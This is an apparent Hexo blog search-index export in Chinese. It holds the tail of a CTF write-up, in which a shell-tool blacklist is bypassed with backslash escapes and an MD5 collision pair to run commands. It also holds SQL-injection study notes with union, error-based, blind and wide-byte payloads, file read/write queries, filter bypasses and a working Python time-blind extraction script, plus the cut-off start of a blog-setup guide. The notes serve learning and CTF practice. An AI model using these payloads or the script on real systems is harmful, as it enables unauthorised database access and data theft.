class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>通过分析源代码可知不能通过img处获得flag<br>然而我们发现cmd命令是通过黑名单验证以及要经过一次md5的校验（常见套路）<br>md5 通过百度查询md5强碰撞的例子即可得到<br>然而cmd参数处的命令执行绕过是通过反斜杠逃逸实现的<br>即<code>ca\t /flag</code>,原理下文剖析<br>于是该题的payload<br><img src="https://img-blog.csdnimg.cn/20200621104053656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200621104053656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="1-md5强碰撞"><a href="#1-md5强碰撞" class="headerlink" title="1.md5强碰撞"></a>1.md5强碰撞</h2><p>参考博客：<a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line">%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></figure><h2 id="2反斜杠逃逸绕过黑名单进行rce"><a href="#2反斜杠逃逸绕过黑名单进行rce" class="headerlink" title="2反斜杠逃逸绕过黑名单进行rce"></a>2反斜杠逃逸绕过黑名单进行rce</h2><p>这个题就卡在这个点上了<br>这个原理是因为 当在前端输入ca\t时<br>后端将此字符存为字符串”ca\\t”<br>而”ca\\t”需要用“\\\\t”来匹配<br>从而绕过正则<br>而且在shell命令里可以随便加\不影响执行<br><img src="https://img-blog.csdnimg.cn/20200621113722287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200621113722287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020062111374516.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020062111374516.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>而<img src="https://img-blog.csdnimg.cn/20200621113831432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200621113831432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200621113857386.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200621113857386.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5强碰撞 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入漏洞总结</title>
      <link href="2020/08/09/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2020/08/09/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>根据sql各种注入的知识点所整理的一点儿笔记</p><span id="more"></span><h2 id="sql注入实战笔记"><a href="#sql注入实战笔记" class="headerlink" title="sql注入实战笔记"></a>sql注入实战笔记</h2><h3 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h3><p>在数据库中有 information_schema 储存着数据库信息 我们可以从中查询任意字段所在的库表列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查库<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">查表<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">查列 <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">查字段 <span class="keyword">select</span> 列名，列名<span class="keyword">from</span> 库名.表名</span><br><span class="line"> limit a,b   (a表示从a<span class="operator">+</span><span class="number">1</span>个数据库开始，b表示从查多少个)</span><br><span class="line">查询各种权限的用户：  <span class="keyword">select</span> <span class="keyword">user</span>()</span><br><span class="line">   <span class="keyword">select</span> <span class="built_in">system_user</span>()</span><br><span class="line">   <span class="keyword">select</span>  <span class="built_in">current_user</span>()</span><br><span class="line">查询当前数据库名称： <span class="keyword">select</span> database()</span><br><span class="line">查询数据库版本: <span class="keyword">select</span> version()</span><br><span class="line">查询数据库路径：<span class="keyword">select</span> @<span class="variable">@datadir</span></span><br><span class="line">查询操作系统：<span class="keyword">select</span> @<span class="variable">@version</span>_compile_os</span><br></pre></td></tr></table></figure><h3 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h3><p>sql注入根据参数所传类型大致可以分为两类 字符型注入和数字型注入</p><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>sql语句大致为  <code>select * from &lt;表名&gt; where id = x</code> </p><p>可以用 and 1=1 和 and 1=2 来判断是否存在注入点</p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>sql语句大致为  <code>select * from &lt;表名&gt; where id = &#39;x&#39;</code> </p><p>我们可以用 <code>1&#39;</code> 和 <code>1&#39;—— qwe</code>  来判断是否存在注入点</p><p>或者 <code>1&#39; and &#39;1&#39;=&#39;1</code> 和 <code>1&#39; and &#39;1&#39;=&#39;2</code> 来判断是否存在注入点</p><h3 id="union-回显注入"><a href="#union-回显注入" class="headerlink" title="union 回显注入"></a>union 回显注入</h3><p>测试当前表中存在几列 order by 3</p><p>测试回显位置  <code>union select 1,2,3</code></p><p>在回显位置 查询 <code>union select 1,2,database()</code></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p> <code>UPDATEXML (XML_document, XPath_string, new_value);</code>  </p><p>该函数用来对xml文档进行更新</p><p>参数1：xml 文档对象</p><p>参数2：路径（Xpath语法）</p><p>参数3：替换查找到的符合条件的数据</p><p>注入原理:通过符号字符构造不符合XPath语法的路径引发报错，从而使得sql语句执行并在报错信息中回显</p><p>例如 <code>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p><h4 id="tips-updatexml-进行显错注入时，只能回显32字节，所以我们最好配合substr函数使用"><a href="#tips-updatexml-进行显错注入时，只能回显32字节，所以我们最好配合substr函数使用" class="headerlink" title="tips : updatexml 进行显错注入时，只能回显32字节，所以我们最好配合substr函数使用"></a>tips : updatexml 进行显错注入时，只能回显32字节，所以我们最好配合substr函数使用</h4><p>所以</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>该函数是用来对xml文档进行查询</p><p>extractvalue(目标xml文档，xml路径) </p><p>注入原理同 updatexml</p><p>例如<code> and extractvalue(1,concat(0x7e,(SELECT @@version),0x7e));</code></p><h4 id="floor-rand-2-双查询报错注入"><a href="#floor-rand-2-双查询报错注入" class="headerlink" title="floor(rand()*2)双查询报错注入"></a>floor(rand()*2)双查询报错注入</h4><p>select …(select …)两个嵌套的查询，里面的select被称为是子查询，执行顺序是先进行子查询再执行外面的select </p><p>rand()随机函数，返回0~1之间的某值</p><p>floor()取整函数</p><p>count()计数函数,返回查询对象的总数</p><p>group by clause分组语句，按照查询结果分组</p><p>最后根据报错显示具体信息</p><p>注入原理：通过floor方法来爆破数据的本质是group by语句的爆破。 <code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行和不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值 </p><p>常用payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10--+</span></span><br></pre></td></tr></table></figure><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>注入原理：通过有无回显信息猜解字符串</p><p>所用函数</p><p>length()  反回字符串长度  例如猜解数据库长度 length(database()) =12</p><p>substr(string,start,length) 截取字符串 例如猜解字符串长度 substr(database(),0,1)=’a’</p><p>left(a,b)截取字符串          例如 left(a,b)从左侧截取 a的前b位  </p><p>regexp 正则匹配函数  例如 select user regexp ‘r’  user 的结果假设是root regexp匹配root的正则</p><p>like 正则匹配函数 select user() like ‘roo%’  也是匹配但是必须从第一个字符开始</p><p> ascii()/ord()  将字符转换成ascii值</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>sleep() 等待几秒 例如 sleep(10)等待十秒</p><p>benchmark(5000000, md5(‘test’)）通过进行大量次数的运算来延时</p><p>if(expr1,expr2,expr3) 如果expr1为TRUE 则返回 expr2;为FLASE 则返回 expr3</p><p><code>and if(1=0,1,sleep(10));</code></p><p>结合布尔盲注的函数 只是换了一种猜解方式</p><h3 id="head头注入"><a href="#head头注入" class="headerlink" title="head头注入"></a>head头注入</h3><p>任何与数据库交互的地方都可能存在sql注入漏洞</p><p>有时候网站会在数据库中保存我们的ip以及User-Agent 信息 如果通过http数据报头形式储存</p><p>那么可以构造http报头的字段进行sql注入</p><p>采用updatexml 函数</p><p>构造如下形式 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span><span class="string">&#x27; or updatexml (1,concat (0x7e,database()),0) or &#x27;</span></span><br></pre></td></tr></table></figure><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前提：sql注入所需要的特殊符号’’或’ 被转义且mysql中采用的是gbk编码</p><p>注入原理：利用了gbk编码的特性</p><p>即0x00-0x7F范围内是单字节第一位，和 ASCII 保持一致。双字节的第一字节范围是0x81-0xFE</p><p>例如</p><p>输入 0xbf27</p><p>转义加上了0xbf5c27</p><p>在mysql解析中变成 0xbf5c 和0x27 从而吃掉了\逃逸出来’</p><p>在sqlmap使用时 –tamper=unmagicquotes.py</p><h3 id="读写文件注入"><a href="#读写文件注入" class="headerlink" title="读写文件注入"></a>读写文件注入</h3><p>读取前提 ：</p><p>1、用户权限足够高，尽量为root用户</p><p>2、secure_file_priv 不为NULL</p><p>读文件</p><p> <code>select load_file(&#39;D:\\flag.txt&#39;)</code></p><p>写入前提：</p><p>1、用户权限足够</p><p>2、set globle general_log=on</p><p>写文件</p><p><code>select 1,2,3 into outfile &#39;路径&#39;</code></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在sql中，;用来当做一条sql语句的结束符号，将多个sql语句通过;分开，一起注入，同时执行，即造成了stacked injection。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>第一次和数据库交互点插入恶意数据，在写入数据库时保留了输入数据的构造特点</p><p>第二次与数据库交互，因为开发者总是默认存入数据库的数据总是安全的，直接从数据库中取出了恶意数据，所以将其作为payload进行二次注入攻击</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><h5 id="bypass-注释"><a href="#bypass-注释" class="headerlink" title="bypass 注释"></a>bypass 注释</h5><p>preg_replace(mixed $pattern,mixed $replacement,mixed $subject)</p><p>通过构造闭合后面的单引号，从而不使用注释符</p><p>or ‘1’=’1</p><h5 id="bypass-and-or"><a href="#bypass-and-or" class="headerlink" title="bypass and or"></a>bypass and or</h5><p>preg_replace 下可以用 双写绕过</p><p>a/**/nd</p><p>符号代替 and–&amp;&amp; or–||</p><h5 id="bypass-空格"><a href="#bypass-空格" class="headerlink" title="bypass 空格"></a>bypass 空格</h5><p>编码：hex,urlencode</p><p>%09 tab键（水平）</p><p>%0a 新建一行</p><p>%0d return 功能</p><p>%0b tab键（垂直）</p><p>括号绕过空格 </p><p>例如<code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></p><h5 id="bypass-union-select"><a href="#bypass-union-select" class="headerlink" title="bypass union select"></a>bypass union select</h5><p>大小写</p><p>双写</p><p>内联注释绕过 </p><h5 id="bypass-‘-“"><a href="#bypass-‘-“" class="headerlink" title="bypass ‘  “"></a>bypass ‘  “</h5><p>十六进制编码</p><p>宽字节注入绕过</p><h5 id="等价函数bypass"><a href="#等价函数bypass" class="headerlink" title="等价函数bypass"></a>等价函数bypass</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br></pre></td></tr></table></figure><h3 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h3><h4 id="时间延迟盲注"><a href="#时间延迟盲注" class="headerlink" title="时间延迟盲注"></a>时间延迟盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">value =<span class="string">&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!\&#123;\&#125;&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def get_length():#获取数据的长度</span></span><br><span class="line"><span class="string">    for n in range(1, 100):</span></span><br><span class="line"><span class="string">        payload = &quot;admin&#x27; and if((length((&#123;0&#125; ))=&#123;1&#125;),(benchmark(5000000, md5(&#x27;test&#x27;))),1) #&quot;.format(data_payload, n)</span></span><br><span class="line"><span class="string">        data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;submit&quot;&#125;</span></span><br><span class="line"><span class="string">        start_time = time.time()</span></span><br><span class="line"><span class="string">        html = requests.post(url, data=data)</span></span><br><span class="line"><span class="string">        end_time = time.time()</span></span><br><span class="line"><span class="string">        use_time = end_time - start_time #求出请求前后的时间差来判断是否延时了</span></span><br><span class="line"><span class="string">        if use_time &gt; 3:</span></span><br><span class="line"><span class="string">            print(&quot;...... data&#x27;s length is :&quot;+ str(n))</span></span><br><span class="line"><span class="string">            return n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#不知道上面这个函数啥情况，总是报一个蜜汁错误，不过不怎么影响</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">length</span>):</span><span class="comment">#获取数据</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> value:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27; and if((ascii(substr((&#123;0&#125; ),&#123;1&#125;,1)) = &#x27;&#123;2&#125;&#x27;),BENCHMARK(100000000, md5(&#x27;test&#x27;)),1) #&quot;</span>.<span class="built_in">format</span>(data_payload,n,<span class="built_in">ord</span>(v))</span><br><span class="line">            data = &#123;<span class="string">&quot;usname&quot;</span>:payload,<span class="string">&quot;pswd&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            requests.post(url,data=data)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            use_time = end_time - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> use_time &gt;<span class="number">6</span>:</span><br><span class="line">                result += v</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;......&quot;</span>+result)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">data_payload =<span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line"> </span><br><span class="line">length =<span class="number">30</span>  <span class="comment">#注意这里要长度加 1 因为 range（1,10）的范围是 1&lt;= x &lt;10</span></span><br><span class="line">get_data(length)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;.....data is :&quot;</span>+ result)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-github博客搭建</title>
      <link href="2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>hexo用来搭建个人博客以及博客个性化很是方便，我写了一下搭建的步骤</p><span id="more"></span><h2 id="hexo-github-博客搭建"><a href="#hexo-github-博客搭建" class="headerlink" title="hexo+github 博客搭建"></a>hexo+github 博客搭建</h2><h4 id="0x01-安装git"><a href="#0x01-安装git" class="headerlink" title="0x01 安装git"></a>0x01 安装git</h4><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723161753.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723161753.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723161753"></p><h4 id="0x02安装nodejs"><a href="#0x02安装nodejs" class="headerlink" title="0x02安装nodejs"></a>0x02安装nodejs</h4><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723194864.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723194864.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723194864"></p><h4 id="0x03github创建个人仓库"><a href="#0x03github创建个人仓库" class="headerlink" title="0x03github创建个人仓库"></a>0x03github创建个人仓库</h4><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723371281.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723371281.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1596723371281"></p><p><img src="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723413667.png" class="lazyload" data-srcset="/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1596723413667.png" 